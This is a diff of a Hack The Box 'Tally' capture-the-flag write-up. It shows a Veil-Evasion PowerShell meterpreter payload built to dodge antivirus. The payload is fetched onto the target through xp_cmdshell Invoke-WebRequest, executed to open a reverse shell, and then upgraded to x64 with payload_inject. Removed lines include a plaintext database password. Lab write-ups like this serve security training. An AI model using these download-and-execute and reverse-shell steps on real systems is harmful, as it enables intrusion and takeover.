@@ -179,24 +179,188 @@ msf auxiliary(mssql_exec) > run
 [*] Auxiliary module execution completed
 ```
 
+Now that we know that there is superb command execution on the machine, we can get a reverse shell
 
-=> SHELL:
-Use veil (22) powershell meterpreter reverse tcp
-Get code in Tally1.bat
-Start Listner
+Its safe to assume that if this is a Sharepoint Server, it might have some AV Protection (Atleast Windows defender :wink: )
 
-use auxiliary/admin/mssql/mssql_exec
-PASSWORD             GWE3V65#6KFH93@4GWTG2G 
-RHOST                10.10.10.59
+Veil-Evasion Incoming!!
 
-set CMD powershell.exe /c Invoke-WebRequest -Uri 10.10.14.198/Tally1.bat -OutFile C:\\Users\\Sarah\\rev.bat
-run
-set CMD cmd.exe /c C:\\Users\\Sarah\\rev.bat
-run
+```
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
 
-=> upgrade to x64
-use windows/local/payload_inject 
-set payload windows/x64/meterpreter/reverse_tcp
+Veil-Evasion Menu
+
+	41 payloads loaded
+
+Available Commands:
+
+	back			Go to main Veil menu
+	checkvt			Check virustotal against generated hashes
+	clean			Remove generated artifacts
+	exit			Exit Veil
+	info			Information on a specific payload
+	list			List available payloads
+	use			Use a specific payload
+
+```
+
+We do a listing of the exploits and we find a **powershell/meterpreter/rev_tcp.py** at 22
+
+We set the LHOST and LPORT
+```
+LHOST           	10.10.14.186	IP of the Metasploit handler
+LPORT           	4444    	Port of the Metasploit handler
+```
+
+And hit generate
+```
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+ [*] Language: powershell
+ [*] Payload Module: powershell/meterpreter/rev_tcp
+ [*] PowerShell doesn't compile, so you just get text :)
+ [*] Source code written to: /var/lib/veil/output/source/Tally.bat
+ [*] Metasploit RC file written to: /var/lib/veil/output/handlers/Tally.rc
+```
+
+Lets copy those 2 files to our folder and start a python SimpleHTTPServer there on port 80
+
+```
+root@kali:~/hackthebox/Machines/Tally# cp /var/lib/veil/output/source/Tally.bat Tally.bat
+root@kali:~/hackthebox/Machines/Tally# cp /var/lib/veil/output/handlers/Tally.rc Tally.rc
+root@kali:~/hackthebox/Machines/Tally# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+We also need to create a listner
+
+```
+root@kali:~/hackthebox/Machines/Tally# msfconsole -r Tally.rc 
+
+[*] Processing Tally.rc for ERB directives.
+resource (Tally.rc)> use exploit/multi/handler
+resource (Tally.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+resource (Tally.rc)> set LHOST 10.10.14.186
+LHOST => 10.10.14.186
+resource (Tally.rc)> set LPORT 4444
+LPORT => 4444
+resource (Tally.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (Tally.rc)> exploit -j
+[*] Exploit running as background job 0.
+
+[*] Started reverse TCP handler on 10.10.14.186:4444 
+```
+
+Going back to our mssql_exec lets issue a command which will download the bat file from our http server
+
+```
+msf auxiliary(mssql_exec) > set CMD powershell.exe /c Invoke-WebRequest -Uri 10.10.14.186/Tally.bat -OutFile C:\\Users\\Sarah\\dotalol.bat
+CMD => powershell.exe /c Invoke-WebRequest -Uri 10.10.14.186/Tally.bat -OutFile C:\Users\Sarah\dotalol.bat
+msf auxiliary(mssql_exec) > run
+
+[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'powershell.exe /c Invoke-WebRequest -Uri 10.10.14.186/Tally.bat -OutFile C:\Users\Sarah\dotalol.bat'
+[*] Auxiliary module execution completed
+
+
+root@kali:~/hackthebox/Machines/Tally# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.59 - - [09/Dec/2017 03:02:04] "GET /Tally.bat HTTP/1.1" 200 -
+```
+
+We can confirm that it was successfully downloaded on the machine with the SimpleHTTPlog
+
+Now we execute the batch file and wait for the reverse shell!
+
+```
+msf auxiliary(mssql_exec) > set CMD cmd.exe /c C:\\Users\\Sarah\\dotalol.bat
+CMD => cmd.exe /c C:\Users\Sarah\dotalol.bat
+msf auxiliary(mssql_exec) > run
+
+[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'cmd.exe /c C:\Users\Sarah\dotalol.bat'
+[*] Auxiliary module execution completed
+
+
+msf exploit(handler) > [*] Sending stage (179267 bytes) to 10.10.10.59
+[*] Meterpreter session 1 opened (10.10.14.186:4444 -> 10.10.10.59:54539)
+meterpreter > sysinfo
+Computer        : TALLY
+OS              : Windows 2016 (Build 14393).
+Architecture    : x64
+System Language : en_GB
+Domain          : HTB.LOCAL
+Logged On Users : 5
+Meterpreter     : x86/windows
+```
+
+There is just one problem
+
+Our shell is x86 while the system is x64
+
+Upgrading our shell to x64 is not that diffucult when we have metasploit at our disposal :D
+
+```
+meterpreter > background 
+[*] Backgrounding session 1...
+msf exploit(handler) > use windows/local/payload_inject
+msf exploit(payload_inject) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(payload_inject) > set LHOST 10.10.14.186
+LHOST => 10.10.14.186
+msf exploit(payload_inject) > set LPORT 4443
+LPORT => 4443
+msf exploit(payload_inject) > set SESSION 1
+SESSION => 1
+msf exploit(payload_inject) > show options
+
+Module options (exploit/windows/local/payload_inject):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   NEWPROCESS  false            no        New notepad.exe to inject to
+   PID                          no        Process Identifier to inject of process to inject payload.
+   SESSION     1                yes       The session to run this module on.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.186     yes       The listen address
+   LPORT     4443             yes       The listen port
+
+msf exploit(payload_inject) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.186:4443 
+[*] Running module against TALLY
+[-] PID  does not actually exist.
+[*] Launching notepad.exe...
+[*] Preparing 'windows/x64/meterpreter/reverse_tcp' for PID 5452
+[*] Sending stage (205379 bytes) to 10.10.10.59
+[*] Meterpreter session 2 opened (10.10.14.186:4443 -> 10.10.10.59:54560) at 2017-12-09 03:07:59 +0530
+
+meterpreter > sysinfo
+Computer        : TALLY
+OS              : Windows 2016 (Build 14393).
+Architecture    : x64
+System Language : en_GB
+Domain          : HTB.LOCAL
+Logged On Users : 5
+Meterpreter     : x64/windows
+```
+
+Why do you spoil me Metasploit!!!!
+
 
 => Root Potato Doh!
 
